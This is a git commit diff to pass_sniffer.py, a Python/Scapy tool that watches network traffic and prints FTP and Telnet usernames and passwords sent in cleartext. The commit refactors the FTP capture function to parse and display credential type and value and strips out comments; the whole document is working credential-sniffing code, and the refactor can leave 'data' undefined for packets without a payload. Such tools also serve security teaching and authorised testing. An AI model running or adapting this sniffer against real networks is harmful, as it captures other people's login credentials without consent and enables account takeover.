94008d6730b0b4558a2a94a9ebc619da66c8f511
lapis-zero09 <shandy1124gaff@gmail.com>
2017-03-08 17:25:10 +0900

    fix pkt

--- pass_sniffer.py
+++ pass_sniffer.py
@@ -17,15 +17,12 @@ def check_packet_detail(packet):
         else:
             return False
 
-def capture_ftp(packet):
-    if packet.haslayer(Raw):
-        data = packet[Raw].load
-    else:
-        return
-
+def capture_ftp(src_ip_port, dst_ip_port, data):
     if 'user' in data.lower() or 'pass' in data.lower():
         if not re.search(r'^[0-9]{3}\s', data):
-            print("[*] [%s -> %s] FTP  %s" % (packet[IP].src, packet[IP].dst, packet[TCP].payload))
+            cred_type, value = data.split()
+            msg = 'FTP %s: %s' % (cred_type, value.replace('\r\n', '').replace('\r', '').replace('\n', ''))
+            print("[*] [%s -> %s]  %s" % (src_ip_port, dst_ip_port, msg))
     else:
         return
 
@@ -34,28 +31,20 @@ def capture_telnet(src_ip_port, dst_ip_port, data, ack, seq):
     msg = None
 
     if src_ip_port in telnet_stream:
-        # Do a utf decode in case the client sends telnet options before their username
-        # No one would care to see that
         try:
             telnet_stream[src_ip_port] += data.decode('utf8')
         except UnicodeDecodeError:
             pass
 
-        # \r or \r\n or \n terminate commands in telnet if my pcaps are to be believed
         if '\r' in telnet_stream[src_ip_port] or '\n' in telnet_stream[src_ip_port]:
             telnet_split = telnet_stream[src_ip_port].split(' ', 1)
             cred_type = telnet_split[0]
             value = telnet_split[1].replace('\r\n', '').replace('\r', '').replace('\n', '')
-            # Create msg, the return variable
+
             msg = 'Telnet %s: %s' % (cred_type, value)
             print("[*] [%s -> %s]  %s" % (src_ip_port, dst_ip_port, msg))
             del telnet_stream[src_ip_port]
 
-    # This part relies on the telnet packet ending in
-    # "login:", "password:", or "username:" and being <750 chars
-    # Haven't seen any false+ but this is pretty general
-    # might catch some eventually
-    # maybe use dissector.py telnet lib?
     if len(telnet_stream) > 100:
         telnet_stream.popitem(last=False)
     mod_load = data.lower().strip()
@@ -76,14 +65,13 @@ def check_packet(packet):
     seq = str(packet[TCP].seq)
     src_ip_port = str(packet[IP].src) + ':' + str(packet[TCP].sport)
     dst_ip_port = str(packet[IP].dst) + ':' + str(packet[TCP].dport)
-    # frag_remover(ack, load)
-    # packet_frag_loads[src_ip_port] = frag_joiner(ack, src_ip_port, load)
+
+    if packet.haslayer(Raw):
+        data = packet[Raw].load
     if app == 'FTP':
-        capture_ftp(packet)
+        capture_ftp(src_ip_port, dst_ip_port, data)
     elif app == 'Telnet':
-        if packet.haslayer(Raw):
-            data = packet[Raw].load
-            capture_telnet(src_ip_port, dst_ip_port, data, ack, seq)
+        capture_telnet(src_ip_port, dst_ip_port, data, ack, seq)
 
 if __name__ == '__main__':
     telnet_stream = OrderedDict()
